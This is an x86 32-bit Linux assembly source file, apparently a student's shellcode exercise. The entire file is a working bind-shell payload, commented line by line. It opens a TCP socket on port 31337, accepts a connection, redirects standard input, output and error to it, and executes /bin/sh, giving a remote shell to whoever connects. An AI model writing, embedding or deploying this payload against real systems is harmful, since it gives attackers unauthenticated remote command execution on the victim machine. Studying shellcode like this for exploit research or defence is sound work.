BITS 32
; Simple 
;
; Written by skuppers: skuppers@student.42.fr

global _start

section .text
    _start:
	; s = socket(PF_INET(2), SOCK_STREAM(1), 0)	
	; for socket calls eax=0x66, ebx specifies syscall, ecx points to args
	push BYTE 0x66	; socketcall is syscall nb°102 (0x66)
	pop eax		; put in eax
	cdq		; Doubles size => edx is nulled
	xor ebx,ebx	; ebx is type of socketcall
	inc ebx		; nb°1 = SYS_SOCKET = socket()
	push edx	; Push arguments (inverted) { proto = 0,
	push BYTE 0x1	;		     		SOCK_STREAM = 1
	push BYTE 0x2	;		     		AF_INET = 2 }
	mov ecx,esp	; ecx points to args
	int 0x80	; eax holds socket fd
	mov esi,eax	; save it here for later
	
	;bind(sockfd(eax), struct sockaddr([PF_INET(2), PORT(31337), 0]), sizeof struct(16))
	push BYTE 0x66		; socketcall
	pop eax
	inc ebx			; up to 2: SYS_BIND = bind()
	push edx		; Build struct sockaddr: INADDR_ANY = 0
	push WORD 0x697a	; 	(inverted)	 PORT = 31337
	push WORD bx		; ebx holds 2		 AF_INET = 2
	mov ecx,esp		; ecx points to struct
	push BYTE 16		; Total args of bind(): { sizeof struct sockaddr = 16,
	push ecx		;			pointer to struct sockaddr,
	push esi		;			socket filedescriptor }
	mov ecx, esp		; ecx -> to args
	int 0x80		; eax = 0 if success

	; listen(sockfd, 4)
	mov BYTE al, 0x66 	; socketcall
	inc ebx
	inc ebx			; ebx = 4 = SYS_LISTEN = listen()
	push ebx		; args: { backlog = 4,
	push esi		;	sockfd }
	mov ecx, esp		; ecx -> args
	int 0x80

	; connection = accept(sockfd, 0, 0)
	mov BYTE al, 0x66	; socketcall
	inc ebx			; ebx = 5 = SYS_ACCEPT = accept()
	push edx		; args: { socketlen = 0,
	push edx		;	&sockaddr = 0,
	push esi		;	file descriptor }
	mov ecx,esp		; ecx -> args
	int 0x80

	; dup2(sockfd, {stdin, out, err })
	xchg eax,ebx		; switch sockfd and 5
	push BYTE 0x2		; ecx = 2
	pop ecx
      dup_loop:			; for loop
	mov BYTE al, 0x3F	; Syscall nb°63 dup2
	int 0x80		; dup2(sockfd, ecx(2,1,0))
	dec ecx			; --ecx
	jns dup_loop		; if ecx > 0

	; execve(char *path, char *argv[], char *envp[])
	mov BYTE al, 11		; syscall 11
	xor edx,edx
	push edx		; Push null
	push 0x68732f2f		; //sh
	push 0x6e69622f		; /bin
	mov ebx, esp		; push '/bin//sh'
	push edx
	mov edx, esp		; empty envp
	push ebx		; '/bin//sh' as arg -> convention
	mov ecx,esp		; argv
	int 0x80
